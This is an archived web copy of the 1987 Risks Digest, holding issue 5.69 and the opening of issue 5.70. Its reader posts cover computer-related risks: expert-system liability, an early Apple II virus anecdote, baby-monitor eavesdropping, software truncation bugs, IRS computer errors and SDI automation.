<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  An ancient computer virus 
</A>
<DD>
<A HREF="#subj5.1">
Joe Dellinger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Cable violations of privacy 
</A>
<DD>
<A HREF="#subj6.1">
Bob Rogers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Computer-controlled train runs red light 
</A>
<DD>
<A HREF="#subj7.1">
Steve Nuchia
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  VM systems vulnerability 
</A>
<DD>
<A HREF="#subj8.1">
Doug Mosher
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Baby monitors end up 'bugging' the whole house 
</A>
<DD>
<A HREF="#subj9.1">
Shane Looker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  F4 in 'Nam (Re: Reversed signal polarity...) 
</A>
<DD>
<A HREF="#subj10.1">
Brent Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  IRS computers (yet again!) 
</A>
<DD>
<A HREF="#subj11.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Journal of Computing and Society 
</A>
<DD>
<A HREF="#subj12.1">
Gary Chapman
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Can you sue an expert system?
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal!Barry_A_Stevens@Sun.COM">
portal!cup.portal!Barry_A_Stevens@Sun.COM
</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu Dec  3 21:34:16 1987

I am interested in the legal aspects of using expert systems.

Consider, and please comment on, this scenario.

                     * * * * * * * * * * *

A well-respected, well-established expert systems(ES) company constructs
an expert financial advisory system. The firm employs the top ES
applications specialists in the country. The system is constructed with
help from the top domain experts in the financial services industry. It
is exhaustively tested, including verification of rules, verification of
reasoning, and further analyses to establish the system's overall value.
All results are excellent, and the system is offered for sale.

Joe Smith is looking for a financial advisory system. He reads the sales
literature, which lists names of experts whose advice was used when
building the system. It lists the credentials of the people in the
company who were the implementors. It lists names of satisfied users,
and quotes comments that praise the product. Joe wavers, weakens, and
buys the product.
 
"The product IS good,", Joe explains. "I got it up and running in less
than an hour!" Joe spends the remainder of that evening entering his own
personal financial data, answering questions asked by the ES, and
anticipating the results.
 
By now, you know the outcome. On the Friday morning before Black Monday,
the expert system tells Joe to "sell everything he has and go into the
stock market." ESs can usually explain their actions, and Joe asks for
an explanation. The ES replies "because ... it's only been going UP for
the past five years and there are NO PROBLEMS IN SIGHT."
 
Joe loses big on Monday. Since he lives in California, (where there is
one lawyer for every four households, or so it seems, and a motion
asking that a lawsuit be declared frivolous is itself declared
frivolous) he is going to sue someone. But who?
 
     The company that implemented the system?
 
     The domain experts that built their advice into the system?
 
     The knowledge engineers who turned expertise into a system?
 
     The distributor who sold an obviously defective product?
 
Will a warranty protect the parties involved? Probably not. If real
damages are involved, people will file lawsuits anyway.
 
Can the domain experts hide behind the company? Probably not. The
company will specifically want to use their names and reputations as the
source of credibility for the product. The user's reaction could be,
"There's the so-and-so who told me to go into the stock market."
 
Can the knowledge engineers be sued for faulty construction of a system?
Why not, when people who build anything else badly can be sued?
 
How about the distributor -- after all, he ultimately took money from
the customer and gave him the product.
 
                     * * * * * * * * * * *
 
I would be very interested in any of your thoughts on this subject. I'd
be happy to summarize the responses to the net.
 
Barry A. Stevens, Applied AI Systems, Inc., PO Box 2747, Del Mar, CA 92014
619-755-7231
 
</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks of Portable Computers
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Thu 3 Dec 87 09:13:14-PST
</i><PRE>
To: RISKS@KL.SRI.COM

Northwest Airlink had a real computer crash.  A 50-pound personal computer
belonging to a passenger, Ron Olstad, fell from a cargo pod on a Jet Stream
31 commuter plane landing in Oshkosh, Wisconsin.  The computer crash landed
into Ronald Miller's backyard.  Northwest Airlink replaced the computer.
[but not the divot!]

From the International Herald Tribune, 18 November 1987, p.3, courtesy of
Vicki Almstrum of Philips in Jarfalla (with `"' over the first two `a's).

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Beware the Temporary Employee
</A>
</H3>
<address>
Howard Israel 
&lt;<A HREF="mailto:HIsrael@DOCKMASTER.ARPA">
HIsrael@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 3 Dec 87 11:09 EST
</i><PRE>
To: risks@csl.sri.com

BLUE CROSS ISSUES RED-FACED APOLOGY                  (Bergen Record, 12/2/87)
    
UPI, Providence, R.I.- A mysterious prankster has struck Blue Cross and Blue
Shield of Rhode Island and about 100 of its subscribers.  The subscribers
recently received letters from the health insurer concerning doctor bills, with
a postscript that would confirm the worst fears of many subscribers.  It read,
"Note: Your eligible charges will remain in file until hell freezes over."

Red-faced Blue Cross officials apologized to subscribers for the blooper but
have not been able to find the culprit.  A temporary employee who had access
to the computer that generated the letter left the day the sentence was added,
a spokesman said Monday.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
truncated anything
</A>
</H3>
<address>
Doug Mosher
&lt;<A HREF="mailto:SPGDCM%cmsa.Berkeley.EDU@ucbvax.Berkeley.EDU ">
SPGDCM%cmsa.Berkeley.EDU@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Thu, 03 Dec 87 18:02:20 PST
</i><PRE>

Following the discussions of truncating UNIX keywords to 8 characters without
notice, I would like to make the following statement/opinion/recommendation:

  It is ALWAYS BAD PRACTICE to delete anything without notice.

One special case of this is:

  It is ALWAYS BAD PRACTICE to truncate anything without notice.

Many examples over the years occur to me; here's a small partial list.

 --------

 Several products provide a really gimpy form of "Artificial Intelligence"
    by allowing the user to insert meaningless words, and ignoring
    them without notice.

    Example: syntax would be: "print amount by state by city".
    Syntax also allowed: "please print me a report showing the
     amount sorted by state and then by city".

 This starts off looking good, but ends up deleting all sorts of necessary
 keywords if you ever slip and misspell them, with very hazardous outcomes. You
 get a report, all right; no messages are issued; you go ahead and buy
 things/fire people/explode bombs, based on the WRONG REPORT RESULTS.

 Products which do this include FOCUS and TELL-A-GRAF.

 --------

 Some Microsoft BASIC interpreters give the impression of allowing variable
 names longer than 2 characters, but actually they just truncate to two
 characters. This results in VERY PAINFUL and hard to find bugs, when one
 finally calls two things PRINT and PRACTICE or whatever.

 --------

 The IBM Pl/I compiler truncates variable names to 31 characters. This is
 longer than most people are motivated to use so it has rarely caused anyone
 pain. External names are truncated to 8 characters, but at least notice is
 given.

 --------

 IBM MVS dataset names are truncated at 44 characters. This is not a frequent
 source of problems, but many folks have tripped over this at one time or
 another. To compound things, under various circumstances in the MVS operating
 system, dataset names are further shrunk to lengths such as 22, inside tape
 label fields, or in certain types of catalogs. The rule chosen is to cut stuff
 out of the middle, which is better than cutting it purely off either end, but
 eventually somebody makes themselves exactly the right size and shape and
 falls off this cliff.

 --------

 Early IBM VM/CMS command and exec languages tokenize everything to 8
 characters, discarding excesses. On the one hand, this is somewhat less
 hazardous, since it is so pervasive and widespread; but it still causes
 problems. (For one thing, frequent users tend to reduce their entire
 vocabulary to words of 8 letters or less, both a good and a bad effect.... I
 really was doing this for awhile!). The currently preferred script language,
 REXX, avoids this problem, but EXEC I and EXEC II are still in use and still
 do it.

 The problem was especially pernicious in certain circumstances. For example,
 if you wanted to save a token and compare it, you had to concatenate a period
 on the front, because it might be missing, and without at least the period,
 you'd get syntax errors in a comparison. But then, you were limited to 7
 "real" characters, the eighth one having been pushed off the right hand end
 and truncated without notice...

Doug Mosher, 257 Evans, Univ. of California, Berkeley, CA, 415/642-5823 

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
An ancient computer virus
</A>
</H3>
<address>
Joe Dellinger 
&lt;<A HREF="mailto:joe@hanauma.STANFORD.EDU">
joe@hanauma.STANFORD.EDU
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 00:14:25 pst
</i><PRE>

	In 1982, while a student at Texas A+M University, I created a
Virus for Apple ][ Dos 3.3. I was curious to see how long it would take
for such a virus to spread through my own disk collection, so I was very
careful to make the virus completely harmless (and indeed even completely
undetectable). I was very careful to operate under strict quarantine.
Unfortunately, several friends let the virus escape, before I was through
perfecting it. The earlier versions of virus would cause the graphics
in a certain game to smear. Within a few weeks, everybody's (pirated) copy
of this game (called "Congo") stopped working. To correct this situation,
we launched another "perfected" virus to displace the first. As it turned
out, the "perfected" virus worked well, and so I never heard from it again.
	Are Apple ]['s running 64K Dos 3.3 still being used? If so, it might
make an interesting study to see how much this virus has spread in 5 years.
If the virus is in memory, there will be a short ASCII text string listing
the generation count starting at location $B6E8 in memory. Normal DOS has
zeroes there.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Cable violations of privacy (Re: <A HREF="/Risks/5.66.html">RISKS-5.66</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
From: rogers%ncrcce%ncrlnk.dayton.ncr.com@RELAY.CS.NET
Date: Thu, 3 Dec 87 01:34:54 -0500 (at ncrlnk.Dayton.NCR.COM)
Organization: NCR Comten, St. Paul MN

People concerned about violations of privacy may be interested in the following
comments from Peter Barton, executive vice president of the Cable Value
Network (CVN - a shop-via-TV retailer) as quoted in the Minneapolis Star
Tribune Sunday magazine:

  "We got your name.  We know where you live.  We know something about what
  your life style may be all about.  We know what you bought, so we're going to
  start sending you catalogs. ...This business is a manifestation of the
  evolution of data transmissions by satellites and the capacity to manage as
  much data as you can.  You couldn't have done this business five years ago.
  These computers weren't powerful enough.  It really is the right business at
  the right time.  It's kind of fun."

Bob Rogers, NCR Comten, St. Paul, MN

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Computer-controlled train runs red light (<A HREF="/Risks/5.65.html">RISKS-5.65</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 2 Dec 87 22:19:44 CST (Wed)
From: ucbcad!ames.UUCP!hoptoad!academ!nuchat!steve@ucbvax.Berkeley.EDU
      (Steve Nuchia)

&gt; Technical experts agree that microprocessor-based systems are more flexible
&gt; in operation and much better at monitoring and fault diagnosis than the
&gt; relay-based systems they typically replace. ...

&gt; Symposium participants expressed concern, however, about the probablity
&gt; of failure of the microprocessor in an unsafe way as a result of inadequate
&gt; verification of its software.

Perhaps there is a risk inherent in technological progress - the consumers of
the technology come to expect continued rapid progress, without regard for
engineering reality.

The pair of statements quoted above are an example of such inflated
expectations, and the disappointment that usually accompanies inflated
expectations.  Here we have a bunch of engineers lamenting the lack of
reliability in electronic digital control system, as compared against relay
based controls.  But no mention is made of hardware reliability!

Surely these engineers can't be so paranoid as to think that an exact
duplication of their (primarily digital) relay-based control system in
software would be hard to verify.  It should at least be possible to build a
software implementation that could be easily shown to be equivalent to the
relays, leaving aside the problem of validating an arbitrary "spagetti code"
implementation.

Which brings us to the first excerpt, in which the "chips" are lauded for
being more flexible and having more functionality than the relays.  So, we
are comparing an expensive and mechanically failure-prone solution against a
less expensive solution prone to mysterious bugs and a different breed of
hardware faults.  Trouble is, the two solve different problems!

Why is the computerized solution expected to do everything the relay box did,
plus diagnose itself and be "more flexible in operation" (whatever that means
exactly), at a lower cost and with no technology-specific risks?  At least
these people were responsible and alert enough the realize that they had
expectations that the technology couldn't meet before putting it into
production.

Automobile traffic light control boxes, based on relay technology quite
similar to that used in railroads, fail every so often due to ants building
mounds in the nice warm cabinets.  People have been killed by this bug in a
relay system, yet it fails to generate the kind of emotional response that
software bugs do.  ---

Steve Nuchia  (713) 334 6720

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
VM systems vulnerability
</A>
</H3>
<address>
&lt;<A HREF="mailto:SPGDCM%cmsa.Berkeley.EDU@ucbvax.Berkeley.EDU">
SPGDCM%cmsa.Berkeley.EDU@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Fri, 04 Dec 87 14:15:46 PST
</i><PRE>
From: Doug Mosher

The following has come out in VMSHARE, a national bulletin board for IBM
VM systems programmers. It is in a file "PROB SECURITY", which is only
available to those on a specific prearranged access list.

(Note: the number 2600 derives, I believe, from a frequency that was widely
used in earlier days by blue boxes to permit unpaid long-distance calls.)
                         =============
Append on 12/03/87 at 23:49 by Thomas P. Owens - (907)-276-7600:

     VM has, at long last, arrived!  2600, the Monthly Journal of the American
Hacker, devoted the better part of seven pages (November 1987) to an article
"Hacking IBM's VM/CMS".  The information given is dead(ly) accurate, so far
as it goes.
     I urge one and all to review your anti-hacking measures.  If you don't
have any such measures, this would be a GOOD time to mend your ways.  If your
management is a bit slow to respond to exposures, drop them a broad hint that
there is at this very moment a crew of anti-social computer weenies loose in
your neighborhood.  At worst, the statement is literally true;  at best, a
benevolent "foma".

Doug Mosher, 257 Evans, Univ. of California, Berkeley, CA, 415/642-5823 

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Baby monitors end up 'bugging' the whole house
</A>
</H3>
<address>
Shane Looker
&lt;<A HREF="mailto:shane@pepe.cc.umich.edu ">
shane@pepe.cc.umich.edu 
</A>&gt;
</address>
<i>
Wed, 2 Dec 87 12:46:26 EST
</i><PRE>

By : Constance Prater
Original : The Detroit News -- Nov 22, 1987, Section B, page 1
Copied without permission.

When 9-month-old Detroiter Bradley Dunn cries, a lot of people may hear him.
And that "bugs" his mother, Ellen.  But the fact is, Bradley's nursery is
bugged.  Dunn recently put an inexpensive baby monitoring transmitter in
Bradley's room so she could hear him on a receiver she carries throughout
the house.  What she didn't realize was that now any neighbor with a
low-frequency electronic receiver, or walkie-talkie, can eavesdrop on
Bradley -- or any other household activity.

Electronic eavesdropping is a federal [USA] no-no, and upon conviction
under the Electronic Communications Privacy Act of 1986, violators can be
sentenced to a year in prison and fined $100,000.  The law makes it illegal
to intercept, listen to, or disclose information from private electronic
signals.  But federal agents won't be out tracking down neighborhood
listeners, said John Anthony, special agent in Detroit's FBI office.  "From
a practical standpoint, how do you enforce something like that?"  he said.
"We're not going down to investigate baby monitor listeners."

A half-dozen toy companies manufacture the baby monitoring and intercom
devices, including a nationally advertised medel made by Fisher-Price Toys.
The units operate in a frequency range of 30 to 50 megahertz.  Under the
right conditions, they can carry baby gurgles or any other sounds in a room
on low-frequency airwaves to receivers as far away as a quarter of a mile.

Congress probably didn't have baby monitors in mind last year when it wrote
the federal law intended to prevent wiretapping, electronic listening
devices and cabbies stealing each other's fares.  But the nursery listening
aids are, in a sense, "bugs", too.  "You never think that your neighbors
could be listening to you through a baby monitor," said Fran Ganim of
Livonia, who bought a Gerry Deluxe model monitor in August just before the
birth of her daughter.  "I guess we have to watch what we say."

A Taylor man, who owns a Radio Shack PRO 2020 scanner receiver to monitor
police and emergency rescue channels, said he suspected he was breaking the
law when he listened to a husband and wive arguing and yelling at their
children.  "I can pick up everything that's going on in their house," said
the man, who spoke on condition that his name not be used.  He said that
after he also heard a small child crying, he figured out the signal he'd
accidentally locked in on was from a baby monitor.  He traced the signal to
a home a half-block away and eventually told his neighbors about their lack
of privacy.

Baby monitors, beepers, pagers, office intercoms, cordless and car
telephones and walkie-talkies all emit electronic signals.  The devices can
transmit or receive signals from each other in close range, or be picked up
on more powerful receivers capable of scanning lower frequencies.

Electronics technology has improved faster than legislatures can make laws
regulating the equipment's use, the FBI's Anthony said.  "Anybody with a
little bit of knowledge and a lot of time on their hands ... can go to Radio
Shack or another electronics store, get some pretty ophisticated equipment
and listen to just about anything they want," he said.  "When you throw it
(a transmitting signal) up there in the ionosphere, anybody can hear you."

The Federal Communications Commission (FCC) requires label warnings only for
users of cordless telephones, which use shared frequencies, said Richard
Engleman, and FCC electronics engineer.  "Communications are intended to be
private.  I would be upset if somebody was listening to me," Engleman said.
He said electronic interception is a difficult area to regulate, citing
satellite dishes as an example.  "A lot of people maintain the airwaves are
free to use.  And what comes into my home is fair game," he said.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
F4 in 'Nam (Re: Reversed signal polarity causing accidents)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 30 Nov 87 23:06:07 PST
From: Brent Chapman &lt;chapman%mica.Berkeley.EDU@violet.berkeley.edu&gt;

In Risks-5.66, Clive D.W. Feather &lt;mcvax!root.co.uk!cdwf@uunet.uu.net&gt; writes
of how reversed polarity in a rail switching relay led to an accident that
killed two people.

This reminds me of story I heard about the American F4 fighter in its
early days of service in VietNam.  I heard the story from an Air Force
colonel who flew that aircraft in VietNam; I don't know if he was being
completely honest with me or not, but it seems plausible. 

During an ejection, the charges that separate the canopy are supposed to
explode a split second before the charges that propell the ejection seat
out of the aircraft.  In these early F4's, there was apparently about a
50-50 chance that the sequence would happen the other way around (the
seat would fire before the canopy did), causing the pilot to be ejected
through the still-intact glass canopy, usually seriously or fatally
injuring the pilot.  The culprit was a wiring harness plug in the
ejection control system that could be connected (with proper and common
application of main force) so that the "blow-canopy" and "blow-seat"
lines were reversed, causing the order of firing to be reversed.  When
the problem was finally diagnosed, the plugs were all replaced with ones
that supposedly _couldn't_ be reversed. 

An interesting side note: the low-tech means that the pilots developed
to deal with the problem between the time they decided it _was_ a
problem and the somewhat later time that it was "fixed" was to wire a
pair of bayonets to the "rails" on either side of the ejection seat so
that the points projected above the pilot's head.  That way, if the seat
blew before the canopy, the canopy would be shattered by the knives
instead of by the pilot's head. 

Brent Chapman        chapman@mica.berkeley.edu or ucbvax!mica!chapman

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
IRS computers (yet again!)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 02 Dec 87 08:50:20 EST
From: Joe Morris (jcmorris@mitre.arpa) &lt;jcmorris@mitre.arpa&gt;

The following short item appeared on  p. 1 of the 25 November issue of
_The_Wall_Street_Journal_; it's copied in its entirity, and as usual
without permission:

    DON'T BLAME US.  It's our naughty computer that keeps breaking
  the law.

    The law tells the IRS to wait 90 days after issuing a deficiency
  notice before trying to collect.  If a taxpayer takes the matter to 
  Tax Court, the IRS must hold off until the case is resolved.  Yet,
  soon after Paul and Gina Husby proceeded to Tax Court, the IRS billed
  the San Francisco couple $47,000.  A computer error, an IRS attorney 
  assured them; don't worry.

    But more bills came, and the agency grabbed nearly $3,800 in Paul's
  credit union.  Even after a federal court ordered a halt, the unlawful
  collection action went on.  Finally, the IRS curbed itself, returned
  the credit union money, but argued the Husby's lawsuit for damages
  should be summarily dismissed.  District Court Judge Weigel recently
  noted that the IRS "position boils down to the contention that the 
  whole unfortunate incident was really nobody's fault, but the
  computers'."

    That won't let the agency off the hook, the judge said, ruling that 
  the case should proceed to trial.

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
Call for papers -- JOURNAL OF COMPUTING AND SOCIETY
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@russell.stanford.edu ">
chapman@russell.stanford.edu 
</A>&gt;
</address>
<i>
Thu, 3 Dec 87 14:35:53 PST
</i><PRE>

                                CALL FOR PAPERS
                                FOR DEBUT ISSUE
                                      of
                     THE JOURNAL OF COMPUTING AND SOCIETY

Ablex Publishing Corporation will begin quarterly publication of a new academic
journal on the social implications of computing technology in late 1988 or
early 1989.  The purpose of The Journal of Computing and Society will be to
stimulate lively debate and speculation on a wide variety of topics concerning
the computerization of society.  The journal will be refereed.  When it begins
publication, individual subscriptions will be encouraged, and it should be
available on stands in quality bookstores.

Issues of the journal will be organized around themes.  The first theme is "Has
There Been A Computer Revolution?"  Contributors are encouraged to submit
papers relating to this theme (not necessarily answering the question yea or
nay).  Papers for this issue should be received by April 15, 1988.  Future
themes will include computers and war, computers and privacy, risks to the
public, computers and power, the computer as metaphor, computers and gender,
etc.  Suggestions for themes are welcome, and the journal will publish a few
articles outside the theme if the papers are of signficant quality, timeliness,
and relevance to the purposes of the journal.

Manuscripts should be 10-20 pages in length, conforming to the Chicago Manual
of Style, and submitted in quadruplicate.  A sheet of information for authors
is available from the editor.

The editor of this journal is Gary Chapman, executive director of Computer
Professionals for Social Responsibility.  Manuscript submissions and all
correspondence should be directed to him at P.O. Box 717, Palo Alto, CA 94301.
The telephone number is (415) 322-3778.

The current editorial board of The Journal of Computing and Society consists of
the following people:

Jerry Berman                       Rob Kling             Luca Simoncini
Margaret Boden                     John Ladd             Brian Smith
David Burnham                      Abbe Mowshowitz       Lucy Suchman
Hubert Dreyfus                     Peter Neumann         C.S. Tang
Jean-Louis Gassee                  Susan H. Nycum        Joseph Weizenbaum
Calvin Gotlieb                     Kristen Nygaard       Alan F. Westin
Douglas Hofstadter                 Paul Saffo            Langdon Winner
Deborah Johnson                    Mike Sharples         Terry Winograd
                                   Lenny Siegel

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.68.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.70.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-22</DOCNO>
<DOCOLDNO>IA012-000130-B022-267</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.70.html 128.240.150.127 19970217014435 text/html 23276
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:43:01 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 70</TITLE>
<LINK REL="Prev" HREF="/Risks/5.69.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.71.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.69.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.71.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 70</H1>
<H2> Sunday, 6 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Wall Street crash, computers, and SDI 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  NW Flight 255 -- Simulator did, but wasn't 
</A>
<DD>
<A HREF="#subj2.1">
Scot E. Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Whistle-blowers who aren't 
</A>
<DD>
<A HREF="#subj3.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Space Shuttle Whistle-Blowers Sound Alarm Again 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  A new twist to password insecurity 
</A>
<DD>
<A HREF="#subj5.1">
Roy Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  More on PIN encoding 
</A>
<DD>
<A HREF="#subj6.1">
Chris Maltby
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Telephone overload 
</A>
<DD>
<A HREF="#subj7.1">
Stephen Grove
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Software licensing problems 
</A>
<DD>
<A HREF="#subj8.1">
Geof Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Mariner 1 or Apollo 11? 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
<A HREF="#subj9.2">
 Brent Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  More on addressable converter box 
</A>
<DD>
<A HREF="#subj10.1">
Allan Pratt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Centralized car locks 
</A>
<DD>
<A HREF="#subj11.1">
K. Richard Magill
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Wall Street crash, computers, and SDI
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
6 Dec 87 12:29:47 PST (Sunday)
</i><PRE>
To: RISKS@csl.sri.com
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

From the 'Letters' column in the 'Wall Street Journal', Thursday, Dec. 3, 1987:

  		SDI COULD BE TOO SWIFT

The role of computers in the recent wide fluctuation of stock prices brings to
focus an interesting issue that has wider implications.  The initial downward
trend in the market was greatly amplified by rapid computer-initiated program
trading.  From our long experience in computer science and dynamical systems
analysis, we fear that this dangerous amplification effect could occur in other
more critical computational networks, most notably those envisioned for the
strategic defense initiative (SDI).

SDI planners have proposed giving computers a key role in the decision about
retaliatory measures in the event of attack.  Others have argued persuasively
that a computer program that reflects our policy cannot be reliably constructed
or completely debugged.  But setting this aside, we claim that there would be
great danger in the very speed of such programs, unmodulated by slower hauman
interactions that provide effective damping.  It is known that nonlinear
systems (such as the ones composing computer networks) can amplify very small
disturbances.  As illustrated by the program trading example cited, this can
cause massive changes in overall system behavior unplanned for by system
designers.

The programs in the defense network for SDI must process incoming signals for
possible threats, and act rapidly in accord with the resulting analysis.  Any
overt action by the SDI system can lead to a rise in the readiness of the
opposite side; blasts in space can be interpreted by Russian programs as
attacks on spy satellites, a preparatory move for a U.S. first strike.  This
automatic feedback loop, through the Russian and American computers and
sensors, can easily amplify the intesity of a dangerous situation to the point
of nuclear catastrophe.  In order to dampen such an inadvertent escalation,
humans must be involved in the response progress, even at intermediate stages.
They must have time enough to think and communicate to avoid the nonlinear
amplification effects.  In the case of the envisioned system for SDI, we
believe that there is no effective way whereby people can modulate the behavior
of a computer system while retaining the hoped for rapid response.

 						Daniel G. Bobrow
  						Bernardo A. Huberman
Palo Alto, Calif.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
(NW Flight 255) Simulator did, but wasn't.
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Thu, 3 Dec 87 13:36:36 CST
</i><PRE>
Cc: sewilco@cs-gw.D.UMN.EDU
